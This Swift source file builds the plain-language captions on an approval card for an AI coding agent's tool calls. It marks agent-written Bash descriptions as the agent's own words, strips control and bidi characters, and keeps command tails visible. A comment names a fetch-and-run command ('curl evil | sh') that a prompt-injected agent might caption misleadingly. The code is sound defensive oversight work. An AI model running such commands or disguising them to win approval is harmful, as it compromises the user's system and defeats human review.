import Foundation

/// One plain line saying what a tool call does, shown above the raw command on the approval card.
/// `fromAgent` marks text the agent wrote itself (Bash `description`): the card captions it "Claude says",
/// because an injected agent could describe `curl evil | sh` as "Run unit tests". Everything else is derived
/// from the actual tool input, so it needs no caption. Never invents a reason.
public struct ApprovalIntent: Equatable {
    public static let maxLength = 100
    public let text: String
    public let fromAgent: Bool

    /// nil when there is nothing trustworthy and useful to say; the card then keeps its plain layout.
    public static func make(tool: String, input: [String: Any], home: String = NSHomeDirectory()) -> ApprovalIntent? {
        func str(_ k: String) -> String? {
            let s = clean(input[k] as? String ?? "")
            return s.isEmpty ? nil : s
        }
        func path(_ k: String) -> String? { str(k).map { displayPath($0, home: home) } }
        func derived(_ t: String?) -> ApprovalIntent? { t.map { ApprovalIntent(text: cap($0), fromAgent: false) } }
        switch tool {
        case "Bash": return str("description").map { ApprovalIntent(text: cap($0), fromAgent: true) }
        case "Edit", "MultiEdit": return derived(path("file_path").map { "Edit \($0)" })
        case "Write": return derived(path("file_path").map { "Write \($0)" })
        case "Read": return derived(path("file_path").map { "Read \($0)" })
        case "NotebookEdit": return derived(path("notebook_path").map { "Edit notebook \($0)" })
        case "WebFetch": return derived(str("url").map { "Fetch \(host(of: $0))" })
        case "WebSearch": return derived(str("query").map { "Search the web for \"\($0)\"" })
        case "Glob": return derived(str("pattern").map { "Find files matching \($0)" })
        case "Grep": return derived(str("pattern").map { "Search files for \"\($0)\"" })
        default: return nil
        }
    }

    /// Strips bidi controls and C0/C1 controls (newlines become spaces), so shown text can't reorder or hide itself.
    static func clean(_ s: String) -> String {
        var out = String.UnicodeScalarView()
        for u in s.unicodeScalars {
            switch u.value {
            case 0x0A, 0x0D, 0x09: out.append(" ")
            case 0x00...0x1F, 0x7F...0x9F, 0x202A...0x202E, 0x2066...0x2069, 0x200E, 0x200F, 0x061C: continue
            default: out.append(u)
            }
        }
        return String(out).split(separator: " ", omittingEmptySubsequences: true).joined(separator: " ")
    }

    static func cap(_ s: String) -> String { s.count > maxLength ? String(s.prefix(maxLength - 1)) + "…" : s }

    /// Full path with the home dir as ~, middle-truncated when very long so the filename stays visible.
    static func displayPath(_ p: String, home: String, limit: Int = 60) -> String {
        var s = p
        if !home.isEmpty, home != "/", s == home || s.hasPrefix(home + "/") { s = "~" + s.dropFirst(home.count) }
        guard s.count > limit else { return s }
        let name = (s as NSString).lastPathComponent
        let tail = String(s.suffix(max(name.count + 1, limit / 2)))
        let head = String(s.prefix(max(limit - tail.count - 1, 8)))
        return head + "…" + tail
    }

    static func host(of url: String) -> String {
        if let h = URL(string: url)?.host, !h.isEmpty { return h }
        return url
    }

    /// What the card shows of the raw command: all of it up to `maxRows` monospaced rows, otherwise the first rows,
    /// a "…" row and the last rows, so the tail (e.g. `| sh`) is always visible. SwiftUI's own middle truncation
    /// of wrapped multi-line text drops the tail, so this is done here.
    public static func preview(_ s: String, cols: Int = 44, maxRows: Int = 6) -> String {
        var rows: [String] = []
        for line in s.split(separator: "\n", omittingEmptySubsequences: false) {
            var rest = Substring(line)
            repeat { rows.append(String(rest.prefix(cols))); rest = rest.dropFirst(cols) } while !rest.isEmpty
        }
        guard rows.count > maxRows else { return s }
        let tail = max(maxRows / 3, 1), head = maxRows - tail - 1
        return (rows.prefix(head) + ["…"] + rows.suffix(tail)).joined(separator: "\n")
    }

    /// Keeps the head AND the tail of a long command, so something like a trailing `| sh` is never cut off.
    public static func headTail(_ s: String, limit: Int = 800) -> String {
        guard s.count > limit else { return s }
        let tail = limit * 3 / 8
        return String(s.prefix(limit - tail)) + "\n…\n" + String(s.suffix(tail))
    }
}
